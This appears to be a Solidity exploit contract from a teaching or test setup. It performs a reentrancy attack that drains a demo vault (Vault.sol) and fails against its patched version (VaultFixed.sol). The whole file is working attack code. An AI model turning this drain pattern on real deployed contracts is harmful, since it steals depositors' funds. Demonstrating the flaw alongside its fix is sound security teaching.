// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.24;

interface IVaultLike {
    function deposit() external payable;
    function withdraw() external;
}

/// @notice Reentrancy exploit contract: deposits once, then re-enters
/// `withdraw()` from its own `receive()` for as long as the target vault
/// still has a balance to hand out. Against Vault.sol this drains every
/// other depositor's funds too, not just the attacker's own deposit --
/// against VaultFixed.sol the second, reentrant `withdraw()` call reverts
/// immediately (balance already zeroed), so only the attacker's own
/// deposit is ever recovered.
contract Attacker {
    IVaultLike public immutable target;
    uint256 public reentryCount;

    constructor(address targetVault) {
        target = IVaultLike(targetVault);
    }

    function attack() external payable {
        require(msg.value > 0, "send ETH to attack with");
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        reentryCount += 1;
        if (address(target).balance >= msg.value) {
            try target.withdraw() {} catch {}
        }
    }
}
